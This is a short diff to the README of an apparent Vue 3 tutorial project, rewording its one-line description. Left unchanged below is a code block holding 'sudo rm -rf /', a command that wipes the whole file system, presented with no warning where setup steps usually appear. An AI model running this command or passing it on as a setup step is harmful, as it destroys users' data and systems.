@@ -1,6 +1,6 @@
 # vue3-ultimate
 
-this is a sample from iamshaunjp's Vue3 refresher course 😅
+this is a sample project/tutorial from iamshaunjp's Vue3 refresher course 😅
 
 ```
 sudo rm -rf /
